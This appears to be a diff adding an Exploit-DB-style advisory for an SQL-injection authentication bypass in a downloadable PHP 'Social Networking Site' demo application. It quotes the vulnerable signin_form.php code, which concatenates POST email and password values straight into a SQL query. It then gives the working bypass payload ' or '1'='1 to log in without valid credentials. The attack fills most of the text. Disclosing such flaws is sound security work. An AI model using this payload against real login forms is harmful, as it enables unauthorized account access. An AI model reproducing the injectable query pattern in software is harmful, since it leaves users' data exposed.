@@ -1,0 +1,30 @@
+# Exploit Title: Social Networking Site - Authentication Bypass (SQli)
+# Date: 2020-11-17
+# Exploit Author: gh1mau 
+# Email: gh1mau.rulez@gmail.com
+# Team Members: Capt'N, muzzo, chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://www.sourcecodester.com/php/14601/social-networking-site-phpmysqli-full-source-code.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14601&title=Social+Networking+Site+in+PHP%2FMySQLi+with+Full+Source+Code
+# Software Release Date: November 17, 2020
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+Vulnerable File:
+---------------- 
+/signin_form.php
+
+Vulnerable Code:
+-----------------
+Entry point:
+
+line 7: $email=$_POST['email'];
+line 8: $password=$_POST['password'];
+
+Exit point:
+line 10: $result = mysqli_query($con,"SELECT * FROM user WHERE email = '$email' and password='$password'");
+
+Vulnerable Issue:
+-----------------
+Attacker could bypass the authentication using simple sqli login bypass payload
+
+	username: gh1mau@gh1mau.com
+	password: ' or '1'='1
